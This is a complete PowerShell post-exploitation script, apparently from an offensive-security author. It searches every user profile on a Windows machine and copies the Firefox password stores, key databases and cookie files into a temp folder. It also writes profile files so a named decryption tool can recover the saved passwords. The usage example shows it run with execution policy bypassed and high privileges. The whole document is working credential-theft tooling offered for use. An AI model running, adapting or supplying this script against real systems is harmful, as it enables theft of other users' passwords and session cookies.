<#
.DESCRIPTION
    Loops through all users in C:\Users and dumps sensitive Mozilla Firefox files. 
    These files can later be used to decrypt stored passwords using `https://github.com/unode/firefox_decrypt` or other similar scripts.
    Needless to say the script needs to be ran as a *high privileged user* to get as much information as possible.

.EXAMPLE
    PS E:\devop-scripts> powershell.exe -ExecutionPolicy Bypass .\firefox_dump.ps1
    [-] 'Public' doesn't have any saved passwords in Mozilla Firefox
    [+] Dumping secrets from 'user' to: C:\Users\void\AppData\Local\Temp\user\firefox\ahf32hh2.default-release
    [+] Dumping secrets from 'user2' to: C:\Users\void\AppData\Local\Temp\user2\firefox\plhh3lmm.default-release
    [-] 'user3' doesn't have any saved passwords in Mozilla Firefox
    [+] Dumping secrets from 'void' to: C:\Users\void\AppData\Local\Temp\void\firefox\plmxz1zm.default-release

.NOTES
    Author: 0xPThree @ Exploit.se
    Date: 2024-06-13
    Version: 1.1
#>

try {
    $rootDirectory = "C:\Users"
    $destinationDirectory = "$ENV:Temp"
    $filesToCopy = @("logins.json", "cert*.db", "key*.db", "cookies.sqlite")
    $found = $false

    Get-ChildItem $rootDirectory -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        $username = $_.Name
        $loginsPaths = Get-ChildItem -Path "$($_.FullName)\AppData\Roaming\Mozilla\Firefox\Profiles" -Filter "logins.json" -Recurse -File -ErrorAction SilentlyContinue
        
        foreach ($loginsPath in $loginsPaths) {
            $found = $true
            $destinationPath = Join-Path -Path $destinationDirectory -ChildPath "$username\firefox"
            $relativeProfilePath = $loginsPath.Directory.FullName.Substring($loginsPath.Directory.Parent.FullName.Length + 1)
            $destinationProfilePath = Join-Path -Path $destinationPath -ChildPath $relativeProfilePath
            
            foreach ($path in ($destinationPath, $destinationProfilePath)) {
                if (-not (Test-Path $path)) {
                    New-Item -ItemType Directory -Path $path -Force | Out-Null
                }
            }
            
            Get-ChildItem -Path $loginsPath.Directory.FullName -Include $filesToCopy -File -Recurse | ForEach-Object {
                $destinationFile = Join-Path -Path $destinationProfilePath -ChildPath $_.FullName.Substring($loginsPath.Directory.FullName.Length + 1)
                $destinationFileDirectory = Split-Path -Path $destinationFile -Parent
                
                if (-not (Test-Path $destinationFileDirectory)) {
                    New-Item -ItemType Directory -Path $destinationFileDirectory -Force | Out-Null
                }
                
                Copy-Item -Path $_.FullName -Destination $destinationFile -Force | Out-Null
            }
            
            $index = 0
            $profilesIniPath = Join-Path -Path $destinationPath -ChildPath "profiles.ini"
            while (Test-Path $profilesIniPath) {
                $index++
                $profilesIniPath = Join-Path -Path $destinationPath -ChildPath ("profiles{0}.ini" -f $index)
            }
            
            $profilesIniContent = @"
[Profile0]
Name=default
IsRelative=1
Path=$($loginsPath.Directory.Name)
"@
            
            Set-Content -Path $profilesIniPath -Value $profilesIniContent -Force | Out-Null
            Write-Host -NoNewline "[+] " -ForegroundColor DarkGreen;  Write-Host -NoNewline "Dumping secrets from '$username' to: $destinationProfilePath"; Write-Host ""
        }
        
        if (-not $loginsPaths) { Write-Host -NoNewline "[-] " -ForegroundColor DarkYellow;  Write-Host -NoNewline "'$username' doesn't have any saved passwords in Mozilla Firefox"; Write-Host "" }
    }

    if (-not $found) { Write-Host -NoNewline "[!] " -ForegroundColor DarkRed;  Write-Host -NoNewline "No passwords saved in Firefox for any user under $rootDirectory"; Write-Host "" }
} catch { Write-Host "An error occurred: $_" -ForegroundColor DarkRed }
